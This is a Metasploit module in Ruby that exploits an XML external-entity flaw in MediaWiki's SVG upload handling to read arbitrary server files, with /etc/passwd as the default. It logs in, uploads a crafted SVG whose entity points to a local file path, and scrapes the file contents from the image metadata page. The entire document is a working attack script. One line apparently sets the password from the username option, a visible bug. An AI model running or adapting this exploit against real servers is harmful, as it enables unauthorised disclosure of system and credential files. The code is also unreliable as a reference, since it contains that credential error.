##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'         => 'MediaWiki SVG XML Entity Expansion Remote File Access',
      'Description'  =>  %q{
          This module attempts to read a remote file from the server using a vulnerability
        in the way MediaWiki handles SVG files. The vulnerability occurs while trying to
        expand external entities with the SYSTEM identifier. In order to work MediaWiki must
        be configured to accept upload of SVG files. If anonymous uploads are allowed the
        username and password aren't required, otherwise they are. This module has been
        tested successfully on MediaWiki 1.19.4, 1.20.3 on Ubuntu 10.04 and Ubuntu 12.10.
        Older versions were also tested but do not seem to be vulnerable to this vulnerability.
        The following MediaWiki requirements must be met: File upload must be enabled,
        $wgFileExtensions[] must include 'svg', $wgSVGConverter must be set to something
        other than 'false'.
      },
      'References'   =>
        [
          [ 'OSVDB', '92490' ],
          [ 'URL', 'https://bugzilla.wikimedia.org/show_bug.cgi?id=46859' ],
          [ 'URL', 'http://www.gossamer-threads.com/lists/wiki/mediawiki-announce/350229']
        ],
      'Author'       =>
        [
          'Daniel Franke',      # Vulnerability discovery and PoC
          'juan vazquez',       # Metasploit module
          'Christian Mehlmauer' # Metasploit module
        ],
      'License'      => MSF_LICENSE
    )

    register_options(
    [
      Opt::RPORT(80),
      OptString.new('TARGETURI', [true, 'Path to MediaWiki', '/mediawiki']),
      OptString.new('RFILE', [true, 'Remote File', '/etc/passwd']),
      OptString.new('USERNAME', [ false,  "The user to authenticate as"]),
      OptString.new('PASSWORD', [ false,  "The password to authenticate with" ])
    ])

    register_autofilter_ports([ 80 ])
  end

  def get_first_session
    res = send_request_cgi({
      'uri'      => normalize_uri(target_uri.to_s, "index.php"),
      'method'   => 'GET',
      'vars_get' => {
        "title"    => "Special:UserLogin",
        "returnto" => "Main+Page"
      }
    })

    if res && res.code == 200 && res.get_cookies =~ /([^\s]*session)=([a-z0-9]+)/
      return $1,$2
    else
      return nil
    end
  end

  def get_login_token
    res = send_request_cgi({
      'uri'      => normalize_uri(target_uri.to_s, "index.php"),
      'method'   => 'GET',
      'vars_get' => {
        "title"    => "Special:UserLogin",
        "returnto" => "Main+Page"
      },
      'cookie' => session_cookie
    })

    if res and res.code == 200 and res.body =~ /name="wpLoginToken" value="([a-f0-9]*)"/
      return $1
    else
      return nil
    end

  end

  def parse_auth_cookie(cookies)
    cookies.split(";").each do |part|
      case part
        when /([^\s]*UserID)=(.*)/
          @wiki_user_id_name = $1
          @wiki_user_id = $2
        when /([^\s]*UserName)=(.*)/
          @wiki_user_name_name = $1
          @wiki_user_name = $2
        when /session=(.*)/
          @wiki_session = $1
        else
          next
      end
    end
  end

  def session_cookie
    if @user and @password
      return "#{@wiki_session_name}=#{@wiki_session}; #{@wiki_user_id_name}=#{@wiki_user_id}; #{@wiki_user_name_name}=#{@wiki_user_name}"
    else
      return "#{@wiki_session_name}=#{@wiki_session}"
    end
  end

  def authenticate
    res = send_request_cgi({
      'uri'      => normalize_uri(target_uri.to_s, "index.php"),
      'method'   => 'POST',
      'vars_get' => {
        "title"  => "Special:UserLogin",
        "action" => "submitlogin",
        "type"   => "login"
      },
      'vars_post' => {
        "wpName"         => datastore['USERNAME'],
        "wpPassword"     => datastore['PASSWORD'],
        "wpLoginAttempt" => "Log+in",
        "wpLoginToken"   => @login_token,
        "returnto"       => "Main+Page"
      },
      'cookie' => session_cookie
    })

    if res and res.code == 302 and res.get_cookies.include?('UserID=')
      parse_auth_cookie(res.get_cookies)
      return true
    else
      return false
    end
  end

  def get_edit_token
    res = send_request_cgi({
      'uri'      => normalize_uri(target_uri.to_s, "index.php", "Special:Upload"),
      'method'   => 'GET',
      'cookie' => session_cookie
    })

    if res and res.code == 200 and res.body =~/<title>Upload file/ and res.body =~ /<input id="wpEditToken" type="hidden" value="([0-9a-f]*)\+\\" name="wpEditToken" \/>/
      return $1
    else
      return nil
    end

  end

  def upload_file
    entity = Rex::Text.rand_text_alpha_lower(3)
    @file_name = Rex::Text.rand_text_alpha_lower(4)
    svg_file = %Q|
    <!DOCTYPE svg [<!ENTITY #{entity} SYSTEM "file://#{datastore['RFILE']}">]>
    <svg xmlns="http://www.w3.org/2000/svg" version="1.1">
      <desc>&#{entity};</desc>
      <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:1;stroke:rgb(0,0,0)" />
    </svg>
    |
    svg_file.gsub!(/\t\t/, "")

    post_data = Rex::MIME::Message.new
    post_data.add_part(svg_file, "image/svg+xml", nil, "form-data; name=\"wpUploadFile\"; filename=\"#{@file_name}.svg\"")
    post_data.add_part("#{@file_name.capitalize}.svg", nil, nil, "form-data; name=\"wpDestFile\"")
    post_data.add_part("", nil, nil, "form-data; name=\"wpUploadDescription\"")
    post_data.add_part("", nil, nil, "form-data; name=\"wpLicense\"")
    post_data.add_part("#{@edit_token}+\\", nil, nil, "form-data; name=\"wpEditToken\"")
    post_data.add_part("Special:Upload", nil, nil, "form-data; name=\"title\"")
    post_data.add_part("1", nil, nil, "form-data; name=\"wpDestFileWarningAck\"")
    post_data.add_part("Upload file", nil, nil, "form-data; name=\"wpUpload\"")

    data = post_data.to_s

    res = send_request_cgi({
      'uri'      => normalize_uri(target_uri.to_s, "index.php", "Special:Upload"),
      'method'   => 'POST',
      'data'     => data,
      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
      'cookie' => session_cookie
    })

    if res and res.code == 302 and res.headers['Location']
      return res.headers['Location']
    else
      # try to output the errormessage
      if res and res.body
        error = res.body.scan(/<div class="error">(.*?)<\/div>/m)[0]
        if error and error.size == 1
          vprint_error(error[0])
        end
      end
      return nil
    end
  end

  def read_data
    res = send_request_cgi({
      'uri'      => @svg_uri,
      'method'   => 'GET',
      'cookie' => session_cookie
    })

    if res and res.code == 200 and res.body =~ /File:#{@file_name.capitalize}.svg/ and res.body =~ /Metadata/ and res.body =~ /<th>Image title<\/th>\n<td>(.*)<\/td>\n<\/tr><\/table>/m
      return $1
    else
      return nil
    end
  end

  def accessfile(rhost)
    vprint_status("#{peer} MediaWiki - Getting unauthenticated session...")
    @wiki_session_name, @wiki_session = get_first_session
    if @wiki_session.nil?
      print_error("#{peer} MediaWiki - Failed to get unauthenticated session...")
      return
    end
    vprint_status("#{peer} Sessioncookie: #{@wiki_session_name}=#{@wiki_session}")

    if @user and not @user.empty? and @password and not @password.empty?
      vprint_status("#{peer} MediaWiki - Getting login token...")
      @login_token = get_login_token
      if @login_token.nil?
        print_error("#{peer} MediaWiki - Failed to get login token")
        return
      end
      vprint_status("#{peer} Logintoken: #{@login_token}")

      if not authenticate
        print_error("#{peer} MediaWiki - Failed to authenticate")
        return
      end
      vprint_status("#{peer} Userid cookie: #{@wiki_user_id_name}=#{@wiki_user_id}")
      vprint_status("#{peer} Username cookie: #{@wiki_user_name_name}=#{@wiki_user_name}")
      vprint_status("#{peer} Session cookie: #{@wiki_session_name}=#{@wiki_session}")
    end

    vprint_status("#{peer} MediaWiki - Getting edit token...")
    @edit_token = get_edit_token
    if @edit_token.nil?
      print_error("#{peer} MediaWiki - Failed to get edit token")
      return
    end
    vprint_status("#{peer} Edittoken: #{@edit_token}")

    vprint_status("#{peer} MediaWiki - Uploading SVG file...")
    @svg_uri = upload_file
    if @svg_uri.nil?
      print_error("#{peer} MediaWiki - Failed to upload SVG file")
      return
    end
    vprint_status("#{peer} SVG URI: #{@svg_uri}")

    vprint_status("#{peer} MediaWiki - Retrieving remote file...")
    loot = read_data
    if loot.nil? or loot.empty?
      print_error("#{peer} MediaWiki - Failed to retrieve remote file")
      return
    end

    f = ::File.basename(datastore['RFILE'])
    path = store_loot('mediawiki.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
    print_good("#{peer} MediaWiki - #{datastore['RFILE']} saved in #{path}")
  end

  def run
    @user = datastore['USERNAME']
    @password = datastore['USERNAME']
    super
  end

  def run_host(ip)
    accessfile(ip)
  end
end
